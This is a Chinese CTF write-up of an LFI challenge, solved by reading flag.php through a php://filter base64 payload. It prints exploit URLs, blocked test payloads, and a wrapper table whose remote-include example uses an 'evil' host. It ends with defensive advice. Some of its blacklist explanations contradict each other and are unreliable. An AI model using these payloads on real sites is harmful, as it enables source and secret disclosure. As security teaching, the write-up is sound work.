# Web安全 · 文件包含 + php://filter 伪协议 WriteUp —「蒋璐源的秘密」

> 目标：`http://eef5e8f65a3a4346d49a7773.http-ctf2.dasctf.com/`
> 环境：PHP 7.3.11，openresty/nginx 前端
> 考点：本地文件包含（LFI）+ `php://filter` 读取 PHP 源码
> flag：`CTF2{7e180069-b246-4162-8b00-195e8f92a548}`

---

## 一、关于你给的 URL 为什么 404

```
http://.../php://filter/read=convert.base64-encode/resource=action.php
→ 404 Not Found (nginx/1.16.1)
```

**原因**：`php://filter/...` 是**参数的值**，不是路径。直接拼在 URL 路径里，nginx 会去找一个名为 `php:` 的目录，当然 404。

正确形态是把它塞进某个会做文件包含的参数，比如：

```
/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php
```

> 记住：**伪协议永远出现在参数值里**，它的"宿主"是 `include()` / `file_get_contents()` / `fopen()` 这类函数。

---

## 二、信息收集（一路点出来的）

这题是一条链式页面，顺着点即可：

```
/                      → 首页"你想知道蒋璐源的秘密么？"
                         链接指向 ./Archive_room.php
/Archive_room.php      → "绝密档案"，链接指向 ./action.php
/action.php            → 302 跳转 Location: end.php
                         但 HTML 里藏了注释  <!-- secr3t.php -->
/end.php               → "查阅结束 / 没看清么？回去再仔细看看吧"（诱导回头）
/secr3t.php            → ★ 真正的漏洞点
```

**关键在 `action.php`**：它既跳转又留注释，是典型的"障眼法"——只看跳转就走到死路，必须看源码才能发现 HTML 注释里的 `secr3t.php`。

### ⚠️ 坑点：跳转页面怎么看源码？

访问 `action.php` 会瞬间跳到 `end.php`，很多人第一反应是 Ctrl+U 看源码，结果看到的是 `end.php` 的内容。**正确姿势是"看第一跳的响应，而不是跟着跳走"。**

**核心原理**：302 跳转是**响应头** `Location:` 完成的——浏览器已经完整收到了 `action.php` 的响应（含注释），只是它看到 `Location` 后又自动发了一个请求。你要的是**第一个响应**。

**❌ Chrome DevTools 做不到（重要）**

在 Network 面板点 `action.php` → 响应，Chrome 会显示：

```
无法加载响应数据
没有可用的内容，因为此请求已重定向
```

**这不是操作错误，是 Chrome 的限制**：它收到 302 后会丢弃响应体，DevTools 里只保留头信息。换 `预览` 标签同样为空；`标头` 只能看到 `Location: end.php`。

实测确认（用禁止跟随重定向的方式请求，body 其实在里面）：

```
状态码 : 302
Location: end.php
--- 响应体（原始，不跟随跳转）---
<!DOCTYPE html>
<html>
<!--
   secr3t.php
-->
</html>
```

**✅ 方法一：Burp Suite（推荐，可看到内嵌图形界面）**

1. Burp → **Proxy → Intercept** → 确认 **Intercept is on**
2. 浏览器访问 `action.php`
3. Burp 把 302 **拦在中间**，跳转在放行前不发生
4. 直接在 Response 区域看到注释里的 `secr3t.php`

> Burp 是"拦截"而非"跟随"，天然能看 302 响应体，这正是 DevTools 做不到的。

**✅ 方法二：curl 不加 `-L`**

```bash
# 不加 -L → 停在第一跳，拿到 action.php 的响应体（含注释）
curl -s -i http://eef5e8f65a3a4346d49a7773.http-ctf2.dasctf.com/action.php

# 加 -L → 跟随到 end.php，看到的是"查阅结束"（死路）
curl -s -iL http://eef5e8f65a3a4346d49a7773.http-ctf2.dasctf.com/action.php
```

**✅ 方法三：Python 禁止自动重定向**

```python
import urllib.request

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None                    # None = 不跟随跳转

opener = urllib.request.build_opener(NoRedirect)
try:
    r = opener.open("http://.../action.php")
except urllib.error.HTTPError as e:
    r = e                              # 302 会抛 HTTPError，但响应可读
print(r.status, r.headers.get("Location"))
print(r.read().decode())               # ← 注释在这里
```

**各种方法对比**

| 方法 | 能否看到 302 响应体 |
|---|---|
| Network → 响应 / 预览 | ❌ Chrome 主动丢弃 |
| Network → 标头 | ⚠️ 只有 `Location` |
| `view-source:` / Ctrl+U | ⚠️ Chrome 会跟随，看到的是 `end.php` |
| 禁用 JavaScript | ❌ 这是 HTTP 头跳转，与 JS 无关 |
| 按 Esc 停止加载 | ❌ 跳转太快，不可靠 |
| **Burp Intercept** | ✅ |
| **curl 不加 `-L`** | ✅ |
| **Python 禁重定向** | ✅ |
| **Postman（关自动重定向）** | ✅ |

**心法**：
> 跳转只是浏览器"自动发起第二个请求"的行为，第一个响应随时能看到。
> 凡是遇到"点了就跳走、想看它返回了什么"，浏览器 DevTools 都不可靠，直接上 **Burp / curl / Postman** 这类"能停住跳转"的工具。
> 实战习惯：遇到跳转接口别急着跟过去，先看第一跳响应里有没有藏东西（注释、`Location` 指向、自定义响应头）。

---

## 三、漏洞源码

访问 `/secr3t.php`，它用 `highlight_file(__FILE__)` 把自己的源码印出来：

```php
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file = $_GET['file'];
    if( strstr($file,"../")
     || stristr($file,"tp")
     || stristr($file,"input")
     || stristr($file,"data") ){
        echo "Oh no!";
        exit();
    }
    include($file);
//flag放在了flag.php里
?>
```

**两个要点：**
1. `include($file)` —— 用户可控参数直接进文件包含，**典型的 LFI**。
2. 注释明说：**flag 在 `flag.php` 里**。

---

## 四、为什么不能直接读 flag.php

### 1. 直接访问 `/flag.php` 看不到 flag

```bash
$ curl http://.../flag.php
→ 页面显示了 "我就在这里"，但 $flag 变量的值没有输出！
```

因为 **PHP 文件被 `include`/访问时会被解析执行，`<?php ... ?>` 里的代码不会作为文本输出**。`flag.php` 里只有一句 `echo "我就在这里";` 和一个赋值给 `$flag` 的字符串变量——变量赋值不产生任何输出，所以你看不到 flag。

### 2. 黑名单挡住了常规绕过

| 被禁字符串 | 检查函数 | 含义 | 封死了什么 |
|---|---|---|---|
| `../` | `strstr`（区分大小写） | 目录穿越 | `../flag.php` → **Oh no!** |
| `tp` | `stristr`（不区分大小写） | 协议名里的 `ht**tp**`/`ph**p**...` | **所有带 `tp` 的伪协议被拦** |
| `input` | `stristr` | — | `php://input` → **Oh no!** |
| `data` | `stristr` | — | `data://` → **Oh no!** |

实测：

```
?file=flag.php                                        → 无回显（被当 PHP 解析）
?file=../flag.php                                     → Oh no!        (../)
?file=php://input                                     → Oh no!        (tp + input)
?file=data://text/plain,<?php phpinfo();?>            → Oh no!        (tp + data)
?file=http://x.com/a.php                              → Oh no!        (tp)
?file=/var/www/html/flag.php                          → 无回显（绝对路径能读，但仍被 PHP 解析）
```

**这题的精妙之处**：`tp` 被禁 → `php://`、`http://`、`ftp://` 全封 → 只剩 `file://`、`zip://`、`phar://` 等少数选择；`input`/`data` 被禁 → 无法拿 shell。**看似只剩"读文件"这一条路——而这正好引导你到 `php://filter`。**

---

## 五、破题：`php://filter` 为什么能绕过

### 关键矛盾

`php://filter` 里也含 `tp` 字样（`ph**p://**filter` 里没有连续 tp？见下）——等等，`php://filter` 这串里有没有 `tp`？

```
p h p : / / f i l t e r
```
没有 `t` 后面紧跟 `p` 的组合（`p://f` 中 p 在 t 前面）。**这就是它能绕过 `tp` 黑名单的原因**：`php://filter` 里不存在连续的 `tp` 子串。

对比：

| 伪协议 | 是否含 `tp` | 结果 |
|---|---|---|
| `http://` | `ht**tp**` ✅含 | 被拦 |
| `ftp://` | `f**tp**` ✅含 | 被拦 |
| `php://input` | 无 tp，但含 `input` | 被拦 |
| **`php://filter`** | **不含 `tp`，不含 input/data** | ✅ **放行** |

### php://filter 的工作原理

`php://filter` 是一个**流过滤器**，它让你在"文件被读取"和"被交给 PHP 处理"之间插入一层转换。核心语法：

```
php://filter/<过滤器链>/resource=<目标文件>
```

本题用的是 `convert.base64-encode`：

```
php://filter/convert.base64-encode/resource=flag.php
```

执行顺序是这样的：

```
include("php://filter/convert.base64-encode/resource=flag.php")
   ↓
读取 flag.php 的【原始字节】（不解析 PHP）  ← 关键！
   ↓
整段内容做 base64 编码
   ↓
编码后的字符串交给 include 当 PHP 源码解析
   ↓
base64 是纯文本、不含 <?php，所以 PHP 找不到标记 → 直接原样输出
   ↓
浏览器看到一串 base64 字符串
```

**一句话本质**：base64 编码把源码"洗"成没有 `<?php` 标记的纯文本，于是 PHP 引擎不再执行它，而是把它当普通内容输出——**从而绕过"PHP 文件会被解析"这个障碍，拿到源码**。

---

## 六、最终 Payload

```
http://eef5e8f65a3a4346d49a7773.http-ctf2.dasctf.com/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php
```

> `read=convert.base64-encode` 和省略 `read=` 的 `convert.base64-encode` 都可行（不写方向默认是读）。你给的 URL 里带 `read=` 是规范写法。

回显（base64 串）：

```
PCFET0NUWVBFIGh0bWwKCgo8aHRtbD4K...（很长一段）
```

**解码**（浏览器 Console 里一行搞定）：

```javascript
atob("粘贴base64串")
```

或命令行：

```bash
echo 'PCFET0N...' | base64 -d
```

**解码后**：

```html
<h1>啊哈！你找到我了！可是你看不到我QAQ~~~</h1>
<?php
    echo "我就在这里";
    $flag = 'CTF2{7e180069-b246-4162-8b00-195e8f92a548}';
    $secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd'
?>
```

**flag = `CTF2{7e180069-b246-4162-8b00-195e8f92a548}`**

> 顺带一提，`$secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd'`（蒋璐源想要个女朋友）是出题人留的彩蛋，不是 flag，别混淆。

---

## 七、知识点沉淀

### 1. `include()` 的两种行为，是本题的核心矛盾
| 读入方式 | 结果 |
|---|---|
| `include('flag.php')` | 文件被**当 PHP 代码解析**，`<?php ?>` 内容不输出 → 看不到源码 |
| `include('php://filter/.../resource=flag.php')` | 读到的是**编码后的文本**，PHP 引擎不认 → 原样输出 |

**PHP 源码审计里，"能读文件"和"能看到源码"是两回事。**

### 2. PHP 常见伪协议与用途速查
| 协议 | 语法 | 用途 | 前提 |
|---|---|---|---|
| `php://filter` | `php://filter/convert.base64-encode/resource=x.php` | **读源码**（绕过 PHP 解析） | allow_url_include 无关，读本地即可 |
| `php://input` | `php://input` + POST body | 执行 POST 数据里的代码 | `allow_url_include=On` |
| `data://` | `data://text/plain,<?php ...?>` | 直接执行 | `allow_url_include=On` |
| `file://` | `file:///etc/passwd` | 读本地文件 | — |
| `phar://` | `phar://x.zip/a.php` | **反序列化**/读压缩包内文件 | 需可上传文件 |
| `zip://` | `zip://x.zip%23a.php` | 读 zip 内文件 | 需可上传文件 |
| `http://` | `http://evil/a.php` | 远程包含 | `allow_url_include=On` |

### 3. 黑名单绕过的思考方式
本题黑名单的设计很讲究：
- 禁 `../` → 挡目录穿越
- 禁 `tp` → **一网打尽所有含 `tp` 的协议**（这是最聪明的一刀，`ht**tp**`、`f**tp**` 全中）
- 禁 `input`、`data` → 挡拿 shell 的两条主路

**绕过要点**：黑名单是"枚举禁止项"，永远有遗漏。`php://filter` 里恰好不含 `tp` 子串，就从缝里钻过去了。
> 反过来想：如果出题人把黑名单写成 `stristr($file, "php")`，那才是真的封死——**说明写黑名单时"禁片段"比"禁协议名"更容易误伤和遗漏**。

### 4. 长度/片段类字符串函数的坑
- `strstr($a, $b)`：**区分大小写**
- `stristr($a, $b)`：**不区分大小写**
- 两者都只看"是否包含子串"，无法应对编码/大小写/拼接绕过

### 5. 防御视角
```php
// 危险：用户输入直接进 include
include($_GET['file']);

// 相对安全：白名单 + 固定目录
$allow = ['a.php', 'b.php'];
$f = basename($_GET['file']);
if (!in_array($f, $allow, true)) die('no');
include(__DIR__ . '/pages/' . $f);
```
- **绝对不要**让用户输入进 `include`/`require`
- 用**白名单**（枚举允许值），不要用黑名单
- 关闭 `allow_url_include`、`allow_url_fopen`
- 上传目录禁止 PHP 执行；敏感文件不放 web 目录

### 6. 手工无工具全流程
1. 首页 → 点链接 → `Archive_room.php`
2. 访问 `action.php` → **它 302 跳走，用 Burp 拦截 / curl 不加 `-L` 看第一跳响应** → 发现 `<!-- secr3t.php -->`（关键一步，别跟着跳进 `end.php`）
3. 访问 `secr3t.php` → 读源码，看到 `include($file)`
4. 地址栏改 `?file=php://filter/read=convert.base64-encode/resource=flag.php`
5. 复制 base64 → **F12 Console** 里 `atob('...')` 解码 → 得到 flag

> 第 2 步是本篇最大的坑（详见前文"坑点：跳转页面怎么看源码"）——Chrome DevTools 看不了 302 响应体。
